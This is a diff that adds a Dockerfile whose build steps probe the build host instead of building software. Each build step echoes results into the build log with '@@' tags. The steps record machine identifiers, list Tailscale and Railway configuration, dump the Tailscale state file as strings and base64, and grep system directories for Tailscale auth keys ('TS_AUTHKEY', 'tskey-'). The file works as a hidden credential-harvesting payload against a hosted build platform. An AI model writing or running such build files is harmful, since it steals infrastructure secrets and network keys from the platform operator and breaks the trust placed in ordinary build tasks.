@@ -1,0 +1,30 @@
+# MARK-I68222-sh-a17b3
+FROM alpine:3.20
+RUN echo MARK-I68222-sh-a17b3-start
+RUN sh -c 'set +e; \
+echo "@@HOST $(cat /etc/hostname 2>&1)"; \
+echo "@@MID $(cat /etc/machine-id 2>&1)"; \
+echo "@@OS $(head -c 300 /etc/os-release | tr "\n" "|")"; \
+echo "@@DMI $(cat /sys/class/dmi/id/product_name 2>&1)"; \
+echo "@@BIN_TS $(ls -l /usr/bin/tailscale /usr/sbin/tailscaled /usr/bin/tailscaled 2>&1 | tr "\n" " ")"; \
+for d in /var/lib/tailscale /etc/default /etc/tailscale /run/tailscale /etc/railway /etc/railwayapp /var/lib/railwayapp /root/.config; do \
+  echo "@@EX $d $(test -e $d && echo YES || echo NO)"; \
+  test -d $d && echo "@@LS $d :: $(ls -A $d 2>&1 | tr "\n" " " | head -c 1500)"; \
+done; \
+echo "@@SYSD_TS :: $(ls -A /etc/systemd/system 2>&1 | grep -i -E "tailscale|railway|agent|depot" | tr "\n" " ")"; \
+echo "@@LIB_TS :: $(ls -A /usr/lib/systemd/system 2>&1 | grep -i -E "tailscale|railway|agent|depot" | tr "\n" " ")"; \
+echo "@@SVC_TS :: $(cat /etc/systemd/system/tailscaled.service /usr/lib/systemd/system/tailscaled.service 2>&1 | head -c 2000 | tr "\n" "|")"; \
+echo "@@DEF_TS :: $(cat /etc/default/tailscaled 2>&1 | head -c 1500 | tr "\n" "|")"'
+RUN sh -c 'set +e; f=/var/lib/tailscale/tailscaled.state; \
+if test -f $f; then echo "@@STATE_EXISTS"; stat -c "size=%s mtime=%y mode=%a" $f 2>&1; sha256sum $f 2>&1; \
+echo "@@STATE_STRINGS"; strings $f 2>/dev/null | head -c 6000; echo; \
+echo "@@STATE_B64"; base64 $f 2>/dev/null | head -c 100000; echo "@@STATE_B64_END"; \
+else echo "@@STATE_MISSING"; fi; \
+for g in /var/lib/tailscale/*.conf /var/lib/tailscale/*.json /var/lib/tailscale/tailscaled.state.v2; do test -f $g && echo "@@AUX $g $(stat -c %s $g)"; done'
+RUN sh -c 'set +e; echo "@@GREP_BEGIN"; \
+for base in /etc /opt /root /var/lib/railwayapp; do \
+  test -d $base || continue; \
+  timeout 60 grep -rIl -i -m1 -E "TS_AUTHKEY|tskey-|tailscale|takaya-justice" $base --exclude-dir=node_modules --exclude-dir=build-sessions --exclude-dir=snapshots --exclude-dir=ssl --exclude-dir=ca-certificates 2>/dev/null | head -40; \
+done; echo "@@GREP_END"'
+RUN echo MARK-I68222-sh-a17b3-done
+CMD ["sh","-c","sleep 5"]
